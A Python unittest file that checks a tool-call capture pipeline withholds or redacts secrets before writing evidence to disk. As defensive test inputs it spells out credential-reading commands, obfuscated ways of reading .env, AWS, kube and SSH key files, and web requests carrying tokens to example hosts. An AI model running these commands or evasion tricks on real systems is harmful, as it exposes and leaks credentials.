"""Adversarial review (secret exfiltration): a credential must not reach a
spool file, and so an uploaded receipt, through any tool.

Every case plants the same marker secret in a tool call (its input or its
result) and asserts that the entry written to the spool does not contain it:
the gate withholds the call, or the result-side redaction removes the value.
The cases are shaped like real tool calls of several runtimes (Claude Code's
Bash/Read/Grep/WebFetch/Agent, MCP tools) but the pipeline never looks at the
tool's name: the same inputs under any other name behave the same.

Also pinned: nothing touches the network while capturing (local-only until
promote), and a withheld stub is refused by promote before any request.

Run with: cd core && python3 -m unittest tests.test_evidence_exfiltration -v
"""

from __future__ import annotations

import json
import os
import socket
import unittest
import urllib.request
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest import mock

from cardinal_core import evidence
from cardinal_core import evidence_capture as cap
from cardinal_core import evidence_promote as promote

SECRET = "Zq9hunter2XYZsecretVALUE"
SESSION = "5e5510n-exfil"


def sh(stdout: str, stderr: str = "") -> dict:
    return {"stdout": stdout, "stderr": stderr, "interrupted": False, "isImage": False}


class ExfiltrationTests(unittest.TestCase):
    def setUp(self):
        self.tmp = TemporaryDirectory()
        self.home = Path(os.path.realpath(self.tmp.name))
        self.cwd = self.home / "repo"
        self.cwd.mkdir()
        (self.cwd / ".env").write_text(f"STRIPE={SECRET}\n")
        os.symlink(self.cwd / ".env", self.cwd / "notes.txt")
        self.n = 0

    def tearDown(self):
        self.tmp.cleanup()

    def capture(self, tool_name, tool_input, response=None, error=None) -> dict:
        self.n += 1
        src, tool = cap.classify_mcp_name(tool_name, "claude-code", ("cardinal",))
        call = cap.ToolCall(runtime="claude-code", tool_name=tool_name, source=src, tool=tool, tool_input=tool_input,
                            response=response, error=error, session_id=SESSION, tool_use_id=f"toolu_{self.n}",
                            cwd=str(self.cwd), spill_root=str(self.home / ".claude" / "projects"),
                            client="claude-code/1.0.0")
        got = cap.capture_call(call, self.home, env={})
        self.assertIsNotNone(got)
        path = evidence.default_root(self.home) / SESSION / f"{got.entry['evidence_id']}.json"
        return json.loads(path.read_text())

    def assertNoSecret(self, entry, label):
        self.assertNotIn(SECRET, json.dumps(entry), label)

    def assertWithheld(self, entry, label):
        self.assertIsInstance(entry.get("withheld"), dict, label)
        self.assertIsNone(entry.get("args"), label)
        self.assertIsNone(entry.get("result"), label)
        self.assertNoSecret(entry, label)

    # -- the input names the secret: withheld ------------------------------

    def test_reads_of_a_secret_file_by_any_spelling_are_withheld(self):
        env = sh(f"STRIPE={SECRET}\n")
        read = {"type": "text", "file": {"content": f"STRIPE={SECRET}\n"}}
        cases = [
            ("Read", {"file_path": str(self.cwd / ".ENV")}, read),
            ("Read", {"file_path": str(self.cwd / "sub" / ".." / ".env")}, read),
            ("Read", {"file_path": str(self.cwd / "notes.txt")}, read),
            ("Read", {"file_path": str(self.home / ".Kube" / "Config")}, read),
            ("Read", {"file_path": "/root/.aws/config"}, read),
            ("Bash", {"command": "cat .e''nv"}, env),
            ("Bash", {"command": "cat .env*"}, env),
            ("Bash", {"command": "cat notes.txt"}, env),
            ("Bash", {"command": "cat $HOME/.kube/config"}, env),
            ("Bash", {"command": "cat ~/.kube/{config,x}"}, env),
            ("Bash", {"command": "cat $(echo LmVudg== | base64 -d)"}, env),
            ("Bash", {"command": "bash -c 'source .env && echo $STRIPE'"}, env),
            ("Bash", {"command": "cat > x <<'EOF'\n" + "z" * (70 << 10) + "\nEOF\ncat .env"}, env),
            ("Grep", {"pattern": "STRIPE", "glob": ".env*", "output_mode": "content"},
             {"mode": "content", "content": f"STRIPE={SECRET}"}),
            ("Glob", {"pattern": "**/.env*"}, {"filenames": [".env"]}),
            ("mcp__fs__read_file", {"path": "~/.aws/credentials"}, f"aws_secret_access_key={SECRET}"),
            ("TotallyNewTool", {"target": {"nested": ["x", "~/.ssh/id_ed25519"]}}, SECRET),
        ]
        for name, ti, resp in cases:
            with self.subTest(tool=name, input=json.dumps(ti)[:80]):
                self.assertWithheld(self.capture(name, ti, resp), f"{name} {ti}")

    def test_commands_that_print_secrets_are_withheld(self):
        for cmd in ("printenv", "env | sort", "echo $OPENAI_KEY", "kubectl exec api-0 -- env", "docker exec c env",
                    "ssh host env", "ps eww", "k get secret db -o yaml", "node -e 'console.log(process.env)'",
                    "python3 -c 'import os; print(os.environ)'", "sh <<< 'printenv'",
                    "npm config get //registry.npmjs.org/:_authToken", "gh auth token", "aws configure get x_secret"):
            with self.subTest(cmd=cmd):
                self.assertWithheld(self.capture("Bash", {"command": cmd}, sh(f"OPENAI_KEY={SECRET}\n{SECRET}\n")),
                                    cmd)

    def test_credentialed_requests_are_withheld(self):
        for ti in ({"url": f"https://x.example.com/cb#access_token={SECRET}", "prompt": "p"},
                   {"url": f"https://x.example.com/a?%74oken={SECRET}", "prompt": "p"},
                   {"url": f"https://gitlab.com/api?private_token={SECRET}", "prompt": "p"},
                   {"url": "https://x.example.com", "headers": {"X-Api-Key": SECRET}},
                   {"request": {"header": f"Authorization: Bearer {SECRET}"}}):
            with self.subTest(ti=ti):
                self.assertWithheld(self.capture("WebFetch", ti, {"result": SECRET}), ti)

    def test_agent_transcripts_and_spilled_outputs_are_withheld(self):
        # A withheld call's output can come back through the transcript or
        # the spill file the runtime kept for it.
        for p in (".claude/projects/-repo/abc.jsonl", ".claude/projects/-repo/abc/tool-results/b1.txt",
                  ".codex/sessions/2026/09/29/rollout.jsonl"):
            with self.subTest(p=p):
                e = self.capture("Read", {"file_path": str(self.home / p)},
                                 {"type": "text", "file": {"content": SECRET}})
                self.assertWithheld(e, p)
                self.assertEqual(e["withheld"]["rule"], "path.agent-transcripts")

    # -- the output carries the secret: redacted ---------------------------

    def test_result_side_redaction_catches_secrets_in_ordinary_output(self):
        k8s_json = json.dumps({"items": [{"spec": {"containers": [{"env": [
            {"name": "STRIPE_SECRET", "value": SECRET}, {"name": "LOG_LEVEL", "value": "debug"}]}]}}]})
        cases = [
            ("kubectl yaml env", "Bash", {"command": "kubectl get pods -o yaml"},
             sh(f"env:\n- name: DB_PASSWORD\n  value: {SECRET}\n- name: LOG_LEVEL\n  value: debug\n")),
            ("kubectl json env", "Bash", {"command": "kubectl get pods -o json"}, sh(k8s_json)),
            ("aws lambda env", "Bash", {"command": "aws lambda get-function-configuration --function-name f"},
             sh(json.dumps({"Environment": {"Variables": {"OPENAI_KEY": SECRET}}}))),
            ("docker inspect Env", "Bash", {"command": "docker inspect web"},
             sh(json.dumps([{"Config": {"Env": [f"OPENAI_KEY={SECRET}", "PATH=/bin"]}}]))),
            ("k8s secret data key", "Bash", {"command": "cat manifest.yaml"}, sh(f"data:\n  tls.key: {SECRET}\n")),
            ("stderr only", "Bash", {"command": "make deploy"}, sh("", f"fatal: DB_PASSWORD={SECRET} rejected")),
            ("failed call error text", "Bash", {"command": "make deploy"}, None),
            ("grep match line", "Grep", {"pattern": "x", "path": "."},
             {"mode": "content", "content": f"{self.cwd}/.env:1:STRIPE={SECRET}\n"}),
            ("grep context line", "Grep", {"pattern": "x", "path": ".", "-C": 1},
             {"mode": "content", "content": f".env-1-{SECRET}\n.env:2:X=1\nsrc/a.ts-3-ok\n"}),
            ("grep context abs aws", "Grep", {"pattern": "aws", "path": str(self.home)},
             {"mode": "content", "content": f"{self.home}/.aws/credentials-3-{SECRET}\n"}),
            ("secrets dir line", "Grep", {"pattern": "x", "path": "."},
             {"mode": "content", "content": f"k8s/secrets/db.yaml:3:  {SECRET}\n"}),
            ("rg heading", "Bash", {"command": "rg -n --heading STRIPE"},
             sh(f"src/a.ts\n1:STRIPE\n\n.env\n1:STRIPE={SECRET}\n2:{SECRET}\n\nsrc/b.ts\n3:x\n")),
            ("agent quoting a token", "Agent", {"prompt": "find the key"},
             {"content": [{"type": "text", "text": f"The key is OPENAI_KEY={SECRET}"}]}),
            ("mcp result", "mcp__pg__query", {"sql": "select * from users"},
             json.dumps([{"email": "a@b.c", "password_hash": SECRET}])),
            ("git remote with token", "Bash", {"command": "git remote -v"},
             sh(f"origin https://x-access-token:{SECRET}@github.com/a/b (fetch)\n")),
        ]
        for label, name, ti, resp in cases:
            with self.subTest(label=label):
                err = f"Exit code 1\nDB_PASSWORD={SECRET}" if resp is None else None
                e = self.capture(name, ti, resp, error=err)
                self.assertIsNone(e.get("withheld"), label)
                self.assertNoSecret(e, label)

    def test_the_summary_and_args_get_the_wide_rules_too(self):
        e = self.capture("Bash", {"command": f"STRIPE_KEY={SECRET} make deploy"}, sh("ok"))
        self.assertIsNone(e.get("withheld"))
        self.assertNoSecret(e, "summary/args")
        self.assertIn("make deploy", e.get("summary", ""))

    def test_ordinary_output_is_kept(self):
        e = self.capture("Grep", {"pattern": "x", "path": "."},
                         {"mode": "content", "content": "src/a-b.ts-1-const a = 1;\nsrc/a-b.ts:2:const b = 2;\n"})
        text = json.dumps(e)
        self.assertIn("const a = 1;", text)
        self.assertIn("const b = 2;", text)
        e = self.capture("Bash", {"command": "kubectl get pods -o yaml"},
                         sh("env:\n- name: LOG_LEVEL\n  value: debug\n"))
        self.assertIn("debug", json.dumps(e))

    def test_a_secret_cut_by_the_result_cap_is_not_half_kept(self):
        for key in ("OPENAI_KEY", "password", "AWS_SECRET_ACCESS_KEY"):
            for pad in (evidence.MAX_RESULT_BYTES - 40, evidence.MAX_RESULT_BYTES + (evidence.MAX_RESULT_BYTES >> 2) - 12):
                with self.subTest(key=key, pad=pad):
                    e = self.capture("Bash", {"command": "cat log"}, sh("y" * pad + f" {key}=" + SECRET * 20))
                    self.assertNotIn(SECRET[:12], json.dumps(e))

    # -- local-only until promote -------------------------------------------

    def test_capture_never_touches_the_network(self):
        boom = mock.Mock(side_effect=AssertionError("network used during capture"))
        with mock.patch.object(socket.socket, "connect", boom), \
                mock.patch.object(socket, "create_connection", boom), \
                mock.patch.object(urllib.request, "urlopen", boom):
            self.capture("Bash", {"command": "make test"}, sh("ok"))
            self.capture("Read", {"file_path": str(self.cwd / ".env")}, {"type": "text", "file": {"content": "x"}})
            self.capture("mcp__grafana__query", {"q": "up"}, '{"data": 1}')
            self.capture("WebFetch", {"url": "https://example.com"}, {"result": "page"})
        boom.assert_not_called()

    def test_promote_refuses_a_withheld_stub_before_any_request(self):
        e = self.capture("Bash", {"command": "cat .env"}, sh(f"STRIPE={SECRET}"))
        self.assertIsNotNone(e.get("withheld"))
        with self.assertRaises(promote.WithheldEntry):
            promote.wire_item(e, "claude-code/1.0.0")


if __name__ == "__main__":
    unittest.main()
